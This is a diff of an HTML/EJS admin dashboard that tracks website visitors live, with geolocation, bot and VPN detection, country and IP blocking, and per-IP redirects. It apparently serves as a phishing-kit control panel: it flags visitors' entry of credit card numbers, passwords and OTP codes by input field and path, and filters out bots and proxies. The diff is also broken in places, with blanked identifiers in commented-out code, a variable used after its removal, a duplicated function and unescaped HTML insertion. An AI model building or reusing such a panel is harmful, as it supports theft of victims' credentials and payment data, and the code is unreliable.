@@ -7,14 +7,17 @@
     <link
       href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
       rel="stylesheet"
+      crossorigin="anonymous"
     />
     <link
       href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css"
       rel="stylesheet"
+      crossorigin="anonymous"
     />
     <link
       href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/6.7.0/css/flag-icons.min.css"
       rel="stylesheet"
+      crossorigin="anonymous"
     />
     <style>
       .table-hover tbody tr:hover {
@@ -83,8 +86,16 @@
         to { opacity: 1; }
       }
     </style>
+    <!-- Add jQuery and Bootstrap JS libraries with SRI hashes for security -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
+    <!-- Add Socket.io client library -->
+    <script src="/socket.io/socket.io.js"></script>
   </head>
   <body class="bg-light">
+    <!-- Toast container for notifications -->
+    <div class="toast-container position-fixed top-0 end-0 p-3" id="toastContainer"></div>
+    
     <div class="container-fluid py-4">
       <div class="row mb-4">
         <div class="col-12 col-md-6 col-lg-3 mb-3">
@@ -121,27 +132,7 @@
         </div>
       </div>
       
-      <!-- Suspicious Activity Card -->
-      <div class="row mb-4">
-        <div class="col-12">
-          <div class="card shadow-sm">
-            <div class="card-header bg-white d-flex justify-content-between align-items-center py-3">
-              <h5 class="mb-0">Suspicious Activity</h5>
-              <button class="btn btn-sm btn-outline-secondary" id="refreshSuspiciousBtn">
-                <i class="bi bi-arrow-clockwise"></i> Refresh
-              </button>
-            </div>
-            <div class="card-body">
-              <div class="row mb-3" id="suspiciousActivityContainer">
-                <div class="col-12 text-center py-4">
-                  <div class="spinner-border" role="status"></div>
-                  <p class="text-muted mt-2">Loading suspicious activity data...</p>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
+      <!-- Country Blocking Section -->
     
 
       <!-- Country Blocking Section -->
@@ -208,11 +199,9 @@
               class="form-check-input"
               type="checkbox"
               id="proxyDetectionToggle"
-              <% proxyDetectionEnabled?'checked':'' %>>
-              
-            <label class="form-check-label" for="proxyDetectionToggle"
-              >Proxy Detection</label
-            >
+              <% proxyDetectionEnabled?'checked':'' %>
+            />
+            <label class="form-check-label" for="proxyDetectionToggle">Proxy Detection</label>
           </div>
         </div>
         <div class="card-body">
@@ -397,23 +386,399 @@
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script src="/socket.io/socket.io.js"></script>
     <script>
+    // Initialize socket.io connection globally
+    const socket = io();
+    
+    // Listen for new visitor events
+    socket.on('new-visitor', function(visitorData) {
+        if (visitorData && visitorData.ip) {
+            const country = visitorData.country || 'Unknown';
+            showToast(`New visitor from ${country}: ${visitorData.ip}`, 'info');
+            // Update dashboard if we're on the visitors tab
+            if ($('#visitors-tab-pane').hasClass('active')) {
+                updateDashboard();
+            }
+        }
+    });
+    
+    // Listen for suspicious activity events
+    socket.on('suspicious-activity', function(data) {
+        if (data && data.ip && data.activity) {
+            // Show toast notification for suspicious activity
+            const activityType = data.activity.type || 'UNKNOWN';
+            showToast(`Suspicious activity detected: ${activityType} from ${data.ip}`, 'warning');
+            
+            // If the IP details modal is currently open for this IP, update it
+            const currentIp = $('#ipDetailsModalLabel').text().replace('IP Details: ', '');
+            if (currentIp === data.ip && $('#ipDetailsModal').hasClass('show')) {
+                viewIpDetails(data.ip);
+            }
+            
+            // Highlight the row in the visitors table
+            highlightVisitorRow(data.ip);
+        }
+    });
+    
+    // Function to highlight a visitor row in the table
+    function highlightVisitorRow(ip) {
+        const row = $(`tr[data-ip="${ip}"]`);
+        if (row.length) {
+            // Add alert class and remove after 5 seconds
+            row.addClass('table-danger');
+            setTimeout(() => {
+                row.removeClass('table-danger');
+            }, 5000);
+        }
+    }
+    
+    // Global functions for button onclick handlers
+    function setRedirectIp(ip) {
+        $('#modalRedirectIpInput').val(ip);
+        // Pre-fill with the default redirect URL if available
+        if (!$('#modalRedirectUrlInput').val()) {
+            $('#modalRedirectUrlInput').val(window.location.origin);
+        }
+    }
+    
+    function blockIp(ip) {
+        // Show the block IP modal with the IP address
+        $('#modalBlockIpInput').val(ip);
+        $('#modalBlockRedirectUrlInput').val('https://www.google.com'); // Default redirect URL
+        $('#blockIpModal').modal('show');
+    }
+    
+    // Function to handle the block IP with redirect form submission
+    function submitBlockIp() {
+        const ip = $('#modalBlockIpInput').val();
+        const redirectUrl = $('#modalBlockRedirectUrlInput').val();
+        
+        if (!ip) {
+            showToast('IP address is required', 'warning');
+            return;
+        }
+        
+        // Send block request to server with redirect URL
+        $.ajax({
+            url: '/dashboard/block',
+            method: 'POST',
+            data: { 
+                ip: ip, 
+                redirectUrl: redirectUrl 
+            },
+            success: function(response) {
+                $('#blockIpModal').modal('hide');
+                if (response.success) {
+                    showToast(response.message || 'IP blocked successfully', 'success');
+                    updateDashboard();
+                } else {
+                    showToast(response.message || 'Failed to block IP', 'danger');
+                }
+            },
+            error: function() {
+                showToast('Failed to block IP', 'danger');
+            }
+        });
+    }
+    
+    function unblockIp(ip) {
+        $.post('/dashboard/unblock', { ip: ip }, function(response) {
+            if (response.success) {
+                showToast('IP unblocked successfully', 'success');
+                updateDashboard();
+            } else {
+                showToast(response.message || 'Failed to unblock IP', 'danger');
+            }
+        }).fail(function() {
+            showToast('Failed to unblock IP', 'danger');
+        });
+    }
+    
+    // Function to refresh the dashboard data
+    function updateDashboard() {
+        // Reload the visitor data from the server
+        $.get('/dashboard/visitors', function(data) {
+            if (!data.success) {
+                showToast('Failed to fetch visitor data', 'danger');
+                return;
+            }
+            
+            // Clear the current visitor table
+            $('#visitorTableBody').empty();
+            
+            // Add each visitor to the table
+            if (data.visitors) {
+                Object.entries(data.visitors).forEach(function([ip, info]) {
+                    addVisitorToTable(ip, info);
+                });
+                
+                // Update visitor counts
+                $('#visitorCount').text(data.totalCount || 0);
+                $('#onlineCount').text(data.onlineCount || 0);
+                
+                // Update other stats
+                const proxyCount = Object.values(data.visitors).filter(v => v.proxy || v.hosting).length;
+                $('#proxyVpn').text(proxyCount);
+                
+                const botCount = Object.values(data.visitors).filter(v => v.isBot).length;
+                $('#botsDetected').text(botCount);
+                
+                // Show toast notification
+                showToast('Dashboard updated successfully', 'success');
+            }
+        }).fail(function(xhr, status, error) {
+            console.error('Error fetching visitor data:', error);
+            showToast('Failed to refresh dashboard data: ' + error, 'danger');
+        });
+    }
+    
+    // Function to add a visitor to the table
+    function addVisitorToTable(ip, info) {
+        // Add online/offline status with badge
+        const statusBadge = info.isOnline ? 
+            '<span class="badge bg-success">Online</span>' : 
+            '<span class="badge bg-secondary">Offline</span>';
+        
+        // Format the date
+        const lastSeen = new Date(info.lastRequest).toLocaleString();
+        
+        // Add proxy/vpn badge if detected
+        const proxyBadge = (info.proxy || info.hosting) ? 
+            '<span class="badge bg-warning">Proxy/VPN</span>' : 
+            '';
+        
+        // Add bot badge if detected
+        const botBadge = info.isBot ? 
+            '<span class="badge bg-info">Bot</span>' : 
+            '';
+        
+        // Add country flag if available
+        const flagImg = info.countryCode && info.countryCode !== 'XX' ? 
+            `<img src="https://flagcdn.com/w40/${info.countryCode.toLowerCase()}" class="country-flag">` : 
+            '<i class="bi bi-globe"></i>';
+        
+        // Country name without flag
+        const countryName = info.countryCode ? 
+            `${info.country || info.countryCode}` : 
+            'Unknown';
+        
+        // Add blocked badge if blocked
+        const blockedBadge = info.isBlocked ? 
+            '<span class="badge bg-danger">Blocked</span>' : 
+            '';
+        
+        // Create row
+        const row = $('<tr></tr>').attr('data-ip', ip);
+        
+        // Add cells
+        row.append(`
+            <td>${ip}</td>
+            <td>${statusBadge} ${proxyBadge} ${botBadge} ${blockedBadge}</td>
+            <td>${flagImg} ${countryName}</td>
+            <td>${info.requestCount || info.visits || 1}</td>
+            <td>${lastSeen}</td>
+            <td>
+                <div class="btn-group btn-group-sm">
+                    <button type="button" class="btn btn-info" onclick="viewIpDetails('${ip}')"><i class="bi bi-info-circle"></i></button>
+                    <button type="button" class="btn btn-primary" onclick="setRedirectIp('${ip}')"><i class="bi bi-arrow-right-circle"></i></button>
+                    ${!info.isBlocked ? 
+                        `<button type="button" class="btn btn-danger" onclick="blockIp('${ip}')"><i class="bi bi-shield-slash"></i></button>` : 
+                        `<button type="button" class="btn btn-success" onclick="unblockIp('${ip}')"><i class="bi bi-shield-check"></i></button>`
+                    }
+                </div>
+            </td>
+        `);
+        
+        // Add to table
+        $('#visitorTableBody').append(row);
+    }
+    
+    function viewIpDetails(ip) {
+        $('#ipDetailsModalLabel').text('IP Details: ' + ip);
+        $('#ipDetailsModalBody').html('<div class="d-flex justify-content-center py-5"><div class="spinner-border" role="status"></div><p class="ms-3 mb-0">Loading...</p></div>');
+        $('#ipDetailsModal').modal('show');
+        
+        $.get('/dashboard/ip/' + ip, function(data) {
+            let html = '<div class="row">';
+            
+            // Left column - Basic info
+            html += '<div class="col-md-6">';
+            html += '<h5>Basic Information</h5>';
+            html += '<table class="table table-sm">';
+            html += `<tr><td>IP Address:</td><td>${data.ip}</td></tr>`;
+            html += `<tr><td>Status:</td><td>${data.isOnline ? '<span class="badge bg-success">Online</span>' : '<span class="badge bg-secondary">Offline</span>'}</td></tr>`;
+            html += `<tr><td>Blocked:</td><td>${data.isBlocked ? '<span class="badge bg-danger">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
+            html += `<tr><td>Bot:</td><td>${data.isBot ? '<span class="badge bg-info">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
+            html += `<tr><td>Proxy/VPN:</td><td>${data.proxy || data.hosting ? '<span class="badge bg-warning">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
+            html += `<tr><td>Current Path:</td><td>${data.lastPath || '/'}</td></tr>`;
+            html += `<tr><td>Request Count:</td><td>${data.requestCount || 0}</td></tr>`;
+            html += '</table>';
+            
+            // Location information
+            if (data.countryCode || data.city) {
+                html += '<h5 class="mt-3">Location</h5>';
+                html += '<table class="table table-sm">';
+                
+                if (data.countryCode && data.countryCode !== 'XX') {
+                    html += `<tr><td>Country:</td><td>
+                        <img src="https://flagcdn.com/w20/${data.countryCode.toLowerCase()}.png" class="me-1">
+                        ${data.country || data.countryCode}
+                    </td></tr>`;
+                }
+                
+                if (data.city) {
+                    html += `<tr><td>City:</td><td>${data.city}</td></tr>`;
+                }
+                
+                if (data.region) {
+                    html += `<tr><td>Region:</td><td>${data.region}</td></tr>`;
+                }
+                
+                if (data.isp) {
+                    html += `<tr><td>ISP:</td><td>${data.isp}</td></tr>`;
+                }
+                
+                html += '</table>';
+            }
+            
+            html += '</div>';
+            
+            // Right column - Device info and suspicious activities
+            html += '<div class="col-md-6">';
+            
+            // Device information
+            html += '<h5>Device Information</h5>';
+            html += '<table class="table table-sm">';
+            html += `<tr><td>Browser:</td><td>${data.browser || 'Unknown'} ${data.browserVersion || ''}</td></tr>`;
+            html += `<tr><td>OS:</td><td>${data.os || 'Unknown'} ${data.osVersion || ''}</td></tr>`;
+            html += `<tr><td>Device:</td><td>${data.device || 'Unknown'}</td></tr>`;
+            html += `<tr><td>First Seen:</td><td>${data.firstRequest ? new Date(data.firstRequest).toLocaleString() : 'Unknown'}</td></tr>`;
+            html += `<tr><td>Last Seen:</td><td>${data.lastRequest ? new Date(data.lastRequest).toLocaleString() : 'Unknown'}</td></tr>`;
+            html += '</table>';
+            
+            // Suspicious Activities section
+            html += '<h5 class="mt-3">Suspicious Activities</h5>';
+            
+            if (data.suspiciousActivities && data.suspiciousActivities.length > 0) {
+                html += '<div class="list-group suspicious-activities-list">';
+                
+                data.suspiciousActivities.forEach(activity => {
+                    const timestamp = new Date(activity.timestamp).toLocaleString();
+                    let badgeClass = 'bg-warning';
+                    
+                    // Determine badge color based on activity type
+                    if (activity.type === 'CREDIT_CARD') badgeClass = 'bg-danger';
+                    if (activity.type === 'PASSWORD') badgeClass = 'bg-warning';
+                    if (activity.type === 'EMAIL') badgeClass = 'bg-info';
+                    if (activity.type === 'PHONE') badgeClass = 'bg-primary';
+                    if (activity.type === 'OTP_CODE') badgeClass = 'bg-danger';
+                    
+                    html += `<div class="list-group-item list-group-item-action p-2">
+                        <div class="d-flex w-100 justify-content-between">
+                            <h6 class="mb-1">
+                                <span class="badge ${badgeClass}">${activity.type}</span>
+                            </h6>
+                            <small class="text-muted">${timestamp}</small>
+                        </div>
+                        <p class="mb-1">${activity.details}</p>
+                        <small class="text-muted">
+                            Path: ${activity.inputData?.path || 'Unknown'}<br>
+                            Input: ${activity.inputData?.inputName || 'Unknown'}
+                        </small>
+                    </div>`;
+                });
+                
+                html += '</div>';
+            } else {
+                html += '<p class="text-muted">No suspicious activities detected</p>';
+            }
+            
+            html += '</div>';
+            html += '</div>'; // Close row
+            
+            // Update modal content with all details
+            $('#ipDetailsModalBody').html(html);
+        }).fail(function() {
+            $('#ipDetailsModalBody').html('<div class="alert alert-danger">Failed to load IP details</div>');
+        });
+    }
       // Throttling variables to prevent 429 errors
       const THROTTLE_DELAY = 5000; // 5 seconds between API calls
       let lastDashboardUpdate = 0;
-      let lastSuspiciousActivityUpdate = 0;
-      let dashboardUpdateTimeout = null;
-      let suspiciousActivityTimeout = null;
-      let pendingDashboardUpdate = false;
-      let pendingSuspiciousUpdate = false;
-      
-      $(document).ready(function() {
-        const socket = io();
+            
+        // Toast notification function
+        function showToast(message, type = 'info') {
+            const toastId = 'toast-' + Date.now();
+            const bgClass = type === 'success' ? 'bg-success' : 
+                          type === 'danger' ? 'bg-danger' : 
+                          type === 'warning' ? 'bg-warning' : 'bg-info';
+            
+            const toast = `
+                <div id="${toastId}" class="toast align-items-center ${bgClass} text-white border-0" role="alert" aria-live="assertive" aria-atomic="true">
+                    <div class="d-flex">
+                        <div class="toast-body">
+                            ${message}
+                        </div>
+                        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
+                    </div>
+                </div>
+            `;
+            
+            // Add toast to container
+            $('#toastContainer').append(toast);
+            
+            // Initialize and show the toast
+            const toastElement = document.getElementById(toastId);
+            const bsToast = new bootstrap.Toast(toastElement, { delay: 5000 });
+            bsToast.show();
+            
+            // Remove toast from DOM after it's hidden
+            toastElement.addEventListener('hidden.bs.toast', function() {
+                $(this).remove();
+            });
+        }
         
-        // Initialize country filter mode from localStorage or server settings
+        $(document).ready(function() {
+            // Initialize socket connection
+            const socket = io();  
+            // Initialize country filter mode from localStorage or server settings
         let countryAllowMode = localStorage.getItem('countryAllowMode') === 'true' || '<%= countryFilterMode %>' === 'allow-only';
         
         // Send current page path to server
         socket.emit('page-view', { path: window.location.pathname });
+        
+        // Handle redirect modal submit button
+        $('#modalRedirectBtn').on('click', function() {
+          const ip = $('#modalRedirectIpInput').val();
+          const redirectUrl = $('#modalRedirectUrlInput').val();
+          
+          if (!ip || !redirectUrl) {
+            showToast('IP address and redirect URL are required', 'danger');
+            return;
+          }
+          
+          // Disable button and show loading state
+          const $btn = $(this);
+          const originalText = $btn.html();
+          $btn.prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+          
+          // Send redirect request to server
+          $.post('/dashboard/redirect-ip', {
+            ip: ip,
+            redirectUrl: redirectUrl
+          }, function(response) {
+            if (response.success) {
+              showToast('Redirect set successfully', 'success');
+              $('#redirectModal').modal('hide');
+            } else {
+              showToast(response.message || 'Failed to set redirect', 'danger');
+            }
+          }).fail(function() {
+            showToast('Failed to set redirect', 'danger');
+          }).always(function() {
+            // Restore button state
+            $btn.prop('disabled', false).html(originalText);
+          });
+        });
         
         // Listen for dashboard updates from server
         socket.on('dashboard-update', function() {
@@ -722,10 +1087,11 @@
               const botBadge = info.isBot ? 
                   '<span class="badge bg-info">Bot</span>' : 
                   '';
+              console.log(info.countryCode);
               
               // Add country flag if available
-              const flagImg = info.countryCode ? 
-                  `<img src="https://flagcdn.com/w40/${info.countryCode.toLowerCase()}.png" class="country-flag">` : 
+              const flagImg = info.countryCode!="XX" ? 
+                  `<img src="https://flagcdn.com/w40/${info.countryCode.toLowerCase()}.png" class="country-flag" crossorigin="anonymous">` : 
                   '<i class="bi bi-globe"></i>';
               
               // Country name without flag
@@ -1237,26 +1603,26 @@ function updateBlockedCountries(countries) {
               const now = Date.now();
               
               // If a request is already pending, mark for update later
-              if (suspiciousActivityTimeout) {
-                  pendingSuspiciousUpdate = true;
-                  return;
-              }
+              // if () {
+              //     pendingSuspiciousUpdate = true;
+              //     return;
+              // }
               
               // Check if we need to throttle
-              if (now - lastSuspiciousActivityUpdate < THROTTLE_DELAY) {
-                  // Schedule update after delay
-                  if (!suspiciousActivityTimeout) {
-                      const delayNeeded = THROTTLE_DELAY - (now - lastSuspiciousActivityUpdate);
-                      suspiciousActivityTimeout = setTimeout(() => {
-                          suspiciousActivityTimeout = null;
-                          if (pendingSuspiciousUpdate) {
-                              pendingSuspiciousUpdate = false;
-                              loadSuspiciousActivity();
-                          }
-                      }, delayNeeded);
-                  }
-                  return;
-              }
+              // if (now - lastSuspiciousActivityUpdate < THROTTLE_DELAY) {
+              //     // Schedule update after delay
+              //     if (!) {
+              //         const delayNeeded = THROTTLE_DELAY - (now - lastSuspiciousActivityUpdate);
+              //          = setTimeout(() => {
+              //              = null;
+              //             if (pendingSuspiciousUpdate) {
+              //                 pendingSuspiciousUpdate = false;
+              //                 loadSuspiciousActivity();
+              //             }
+              //         }, delayNeeded);
+              //     }
+              //     return;
+              // }
               
               // Update timestamp
               lastSuspiciousActivityUpdate = now;
@@ -1265,21 +1631,21 @@ function updateBlockedCountries(countries) {
                   const tbody = $('#suspiciousTableBody');
                   tbody.empty();
                   
-                  if (data.length === 0) {
-                      tbody.append('<tr><td colspan="7" class="text-center">No suspicious activity detected</td></tr>');
-                      return;
-                  }
+                  // if (data.length === 0) {
+                  //     tbody.append('<tr><td colspan="7" class="text-center">No suspicious activity detected</td></tr>');
+                  //     return;
+                  // }
                   
                   data.forEach(visitor => {
                       const row = $('<tr></tr>');
                       
-                      // Format risk level badge
-                      let badgeClass = 'bg-success';
-                      if (visitor.suspiciousActivity.riskLevel === 'High') {
-                          badgeClass = 'bg-danger';
-                      } else if (visitor.suspiciousActivity.riskLevel === 'Medium') {
-                          badgeClass = 'bg-warning';
-                      }
+                      // // Format risk level badge
+                      // let badgeClass = 'bg-success';
+                      // if (visitor.suspiciousActivity.riskLevel === 'High') {
+                      //     badgeClass = 'bg-danger';
+                      // } else if (visitor.suspiciousActivity.riskLevel === 'Medium') {
+                      //     badgeClass = 'bg-warning';
+                      // }
                       
                       // Format last seen time
                       const lastSeen = new Date(visitor.lastSeen).toLocaleString();
@@ -1291,16 +1657,34 @@ function updateBlockedCountries(countries) {
                       
                       // Add online status badge
                       const statusBadge = visitor.isOnline ? 
-                          '<span class="badge bg-success">Online</span>' : 
-                          '<span class="badge bg-secondary">Offline</span>';
+                          '<span class="badge bg-success me-1">Online</span>' : 
+                          '<span class="badge bg-secondary me-1">Offline</span>';
                       
-                      // Add blocked badge if blocked
+                      // Add visitor type badges
+                      let visitorTypeBadges = '';
+                      
+                      // Human badge (default if not bot and not proxy)
+                      if (!visitor.isBot && !visitor.proxy) {
+                          visitorTypeBadges += '<span class="badge bg-success me-1">Human</span>';
+                      }
+                      
+                      // Bot badge
+                      if (visitor.isBot) {
+                          visitorTypeBadges += '<span class="badge bg-info me-1">Bot</span>';
+                      }
+                      
+                      // VPN/Proxy badge
+                      if (visitor.proxy) {
+                          visitorTypeBadges += '<span class="badge bg-warning me-1">VPN/Proxy</span>';
+                      }
+                      
+                      // Blocked badge
                       const blockedBadge = visitor.isBlocked ? 
-                          '<span class="badge bg-danger">Blocked</span>' : 
+                          '<span class="badge bg-danger me-1">Blocked</span>' : 
                           '';
                       
                       row.append(`<td>${visitor.ip}</td>`);
-                      row.append(`<td>${statusBadge} ${blockedBadge}</td>`);
+                      row.append(`<td>${statusBadge} ${visitorTypeBadges} ${blockedBadge}</td>`);
                       row.append(`<td class="text-center">${flagImg}</td>`);
                       row.append(`<td>${visitor.country || 'Unknown'}</td>`);
                       row.append(`<td><span class="badge ${badgeClass}">${visitor.suspiciousActivity.riskLevel}</span></td>`);
@@ -1392,7 +1776,7 @@ function updateBlockedCountries(countries) {
                   // Location Section
                   html += '<div class="row mb-4"><div class="col-12"><h5>Location</h5><hr></div>';
                   if (data.countryCode && data.countryCode !== 'XX') {
-                      html += '<div class="col-md-6"><p><strong>Country:</strong> <img src="https://flagcdn.com/w20/' + data.countryCode.toLowerCase() + '.png" class="me-1">' + data.country + '</p></div>';
+                      html += '<div class="col-md-6"><p><strong>Country:</strong> <img src="https://flagcdn.com/w40/' + data.countryCode.toLowerCase() + '" class="me-1">' + data.country + '</p></div>';
                   } else {
                       html += '<div class="col-md-6"><p><strong>Country:</strong> ' + (data.country || 'Unknown') + '</p></div>';
                   }
@@ -1408,25 +1792,6 @@ function updateBlockedCountries(countries) {
                   html += '<div class="col-md-6"><p><strong>Device:</strong> ' + (data.device || 'Unknown') + '</p></div>';
                   html += '<div class="col-md-6"><p><strong>User Agent:</strong> ' + (data.userAgent || 'Unknown') + '</p></div>';
                   html += '</div>';
-                  
-                  // Suspicious Activity Section
-                  if (data.suspiciousActivity) {
-                      const riskClass = data.suspiciousActivity.riskLevel === 'High' ? 'danger' : 
-                                       data.suspiciousActivity.riskLevel === 'Medium' ? 'warning' : 'success';
-                      
-                      html += '<div class="row mb-4"><div class="col-12"><h5>Suspicious Activity</h5><hr></div>';
-                      html += '<div class="col-md-6"><p><strong>Risk Level:</strong> <span class="badge bg-' + riskClass + '">' + data.suspiciousActivity.riskLevel + '</span></p></div>';
-                      html += '<div class="col-md-6"><p><strong>Risk Score:</strong> ' + data.suspiciousActivity.riskScore.score + '/' + data.suspiciousActivity.riskScore.max + '</p></div>';
-                      
-                      if (data.suspiciousActivity.factors && data.suspiciousActivity.factors.length > 0) {
-                          html += '<div class="col-12"><p><strong>Suspicious Factors:</strong></p><ul>';
-                          data.suspiciousActivity.factors.forEach(factor => {
-                              html += '<li>' + factor + '</li>';
-                          });
-                          html += '</ul></div>';
-                      }
-                      html += '</div>';
-                  }
                   
                   // Activity Timeline
                   html += '<div class="row mb-4"><div class="col-12"><h5>Activity Timeline</h5><hr></div>';
@@ -1477,157 +1842,36 @@ function updateBlockedCountries(countries) {
               });
           }
           
-          // Load and display suspicious activity data
-          function loadSuspiciousActivity() {
-              const now = Date.now();
-              
-              // If a request is already pending, don't make another one
-              if (suspiciousUpdateTimeout) {
-                  return;
-              }
-              
-              // Check if we need to throttle
-              if (now - lastSuspiciousActivityUpdate < THROTTLE_DELAY) {
-                  // Schedule update after delay
-                  if (!suspiciousUpdateTimeout) {
-                      const delayNeeded = THROTTLE_DELAY - (now - lastSuspiciousActivityUpdate);
-                      suspiciousUpdateTimeout = setTimeout(() => {
-                          suspiciousUpdateTimeout = null;
-                          loadSuspiciousActivity();
-                      }, delayNeeded);
-                  }
-                  return;
-              }
-              
-              // Update timestamp
-              lastSuspiciousActivityUpdate = now;
-              
-              $('#suspiciousActivityContainer').html('<div class="col-12 text-center py-4"><div class="spinner-border" role="status"></div><p class="text-muted mt-2">Loading suspicious activity data...</p></div>');
-              
-              $.get('/dashboard/suspicious-activity', function(data) {
-                  if (data.length === 0) {
-                      $('#suspiciousActivityContainer').html('<div class="col-12 text-center py-4"><p class="text-muted">No suspicious activity detected</p></div>');
-                      return;
-                  }
-                  
-                  let html = '';
-                  
-                  // Create summary cards for high, medium risk visitors
-                  const highRiskCount = data.filter(v => v.suspiciousActivity.riskLevel === 'High').length;
-                  const mediumRiskCount = data.filter(v => v.suspiciousActivity.riskLevel === 'Medium').length;
-                  
-                  html += '<div class="col-md-6 col-lg-3 mb-3">';
-                  html += '<div class="card bg-danger text-white">';
-                  html += '<div class="card-body">';
-                  html += '<h5 class="card-title">High Risk Visitors</h5>';
-                  html += `<h2 class="mb-0">${highRiskCount}</h2>`;
-                  html += '</div></div></div>';
-                  
-                  html += '<div class="col-md-6 col-lg-3 mb-3">';
-                  html += '<div class="card bg-warning text-dark">';
-                  html += '<div class="card-body">';
-                  html += '<h5 class="card-title">Medium Risk Visitors</h5>';
-                  html += `<h2 class="mb-0">${mediumRiskCount}</h2>`;
-                  html += '</div></div></div>';
-                  
-                  html += '<div class="col-12 mt-3">';
-                  html += '<h6>Suspicious Visitors</h6>';
-                  html += '<div class="table-responsive">';
-                  html += '<table class="table table-sm table-hover">';
-                  html += '<thead><tr>';
-                  html += '<th>IP</th>';
-                  html += '<th>Risk Level</th>';
-                  html += '<th>Risk Score</th>';
-                  html += '<th>Country</th>';
-                  html += '<th>Status</th>';
-                  html += '<th>Suspicious Factors</th>';
-                  html += '<th>Actions</th>';
-                  html += '</tr></thead>';
-                  html += '<tbody>';
-                  
-                  // Add rows for each suspicious visitor
-                  data.forEach(visitor => {
-                      const riskBadgeClass = visitor.suspiciousActivity.riskLevel === 'High' ? 'bg-danger' : 'bg-warning text-dark';
-                      
-                      html += '<tr>';
-                      html += `<td>${visitor.ip}</td>`;
-                      html += `<td><span class="badge ${riskBadgeClass}">${visitor.suspiciousActivity.riskLevel}</span></td>`;
-                      html += `<td>${visitor.suspiciousActivity.riskScore.score}/${visitor.suspiciousActivity.riskScore.max}</td>`;
-                      
-                      // Country with flag
-                      if (visitor.countryCode && visitor.countryCode !== 'XX') {
-                          html += `<td><img src="https://flagcdn.com/w20/${visitor.countryCode.toLowerCase()}.png" class="me-1">${visitor.country}</td>`;
-                      } else {
-                          html += '<td>Unknown</td>';
-                      }
-                      
-                      // Status badges
-                      let statusBadges = '';
-                      if (visitor.isOnline) {
-                          statusBadges += '<span class="badge bg-success me-1">Online</span>';
-                      }
-                      if (visitor.isBlocked) {
-                          statusBadges += '<span class="badge bg-danger me-1">Blocked</span>';
-                      }
-                      html += `<td>${statusBadges || '<span class="badge bg-secondary">Offline</span>'}</td>`;
-                      
-                      // Suspicious factors
-                      html += '<td>';
-                      visitor.suspiciousActivity.factors.forEach(factor => {
-                          html += `<span class="badge bg-secondary me-1 mb-1">${factor}</span>`;
-                      });
-                      html += '</td>';
-                      
-                      // Actions
-                      html += '<td>';
-                      html += `<button class="btn btn-sm btn-info me-1" onclick="viewIpDetails('${visitor.ip}')"><i class="bi bi-info-circle"></i></button>`;
-                      if (!visitor.isBlocked) {
-                          html += `<button class="btn btn-sm btn-danger" onclick="blockIp('${visitor.ip}')"><i class="bi bi-shield-fill-x"></i></button>`;
-                      } else {
-                          html += `<button class="btn btn-sm btn-success" onclick="unblockIp('${visitor.ip}')"><i class="bi bi-shield-fill-check"></i></button>`;
-                      }
-                      html += '</td>';
-                      html += '</tr>';
-                  });
-                  
-                  html += '</tbody></table>';
-                  html += '</div></div>';
-                  
-                  $('#suspiciousActivityContainer').html(html);
-              }).fail(function() {
-                  $('#suspiciousActivityContainer').html('<div class="alert alert-danger">Failed to load suspicious activity data</div>');
-              });
-            
-          }
-          
-          // Function to view IP details (continued)
-          function viewIpDetails(ip) {
-              $('#ipDetailsModalLabel').text('IP Details: ' + ip);
-              $('#ipDetailsModalBody').html('<div class="d-flex justify-content-center py-5"><div class="spinner-border" role="status"></div><p class="ms-3 mb-0">Loading...</p></div>');
-              $('#ipDetailsModal').modal('show');
-              
-              $.get('/dashboard/ip-details/' + ip, function(data) {
-                  let html = '<div class="row">';
-                  // Left column - Basic info
-                  html += '<div class="col-md-6">';
-                  html += '<h5>Basic Information</h5>';
-                  html += '<table class="table table-sm">';
-                  html += `<tr><td>IP Address:</td><td>${data.ip}</td></tr>`;
-                  html += `<tr><td>Status:</td><td>${data.isOnline ? '<span class="badge bg-success">Online</span>' : '<span class="badge bg-secondary">Offline</span>'}</td></tr>`;
-                  html += `<tr><td>Blocked:</td><td>${data.isBlocked ? '<span class="badge bg-danger">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
-                  html += `<tr><td>Bot:</td><td>${data.isBot ? '<span class="badge bg-info">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
-                  html += `<tr><td>Proxy/VPN:</td><td>${data.proxy || data.hosting ? '<span class="badge bg-warning">Yes</span>' : '<span class="badge bg-success">No</span>'}</td></tr>`;
-                  html += `<tr><td>Current Path:</td><td>${data.lastPath || '/'}</td></tr>`;
-                  html += `<tr><td>Request Count:</td><td>${data.requestCount || 0}</td></tr>`;
-                  html += '</table>';
-                  html += '</div>';
+          // Function to view IP details }
+           
+           // Function to view IP details
+           function viewIpDetails(ip) {
+               $('#ipDetailsModalLabel').text('IP Details: ' + ip);
+               $('#ipDetailsModalBody').html('<div class="d-flex justify-content-center py-5"><div class="spinner-border" role="status"></div><p class="ms-3 mb-0">Loading...</p></div>');
+               $('#ipDetailsModal').modal('show');
+               
+               $.get('/dashboard/ip-details/' + ip, function(data) {
+                   let html = '<div class="row">';
+                   // Left column - Basic info
+                   html += '<div class="col-md-6">';
+                   html += '<h5>Basic Information</h5>';
+                   html += '<table class="table table-sm">';
+                   html += `<tr><td>IP Address:</td><td>${data.ip}</td></tr>`;
+                   html += `<tr><td>Status:</td><td>${data.isOnline ? '<span class="badge bg-success">Online</span>' : '<span class="badge bg-secondary">Offline</span>'}</td></tr>`;
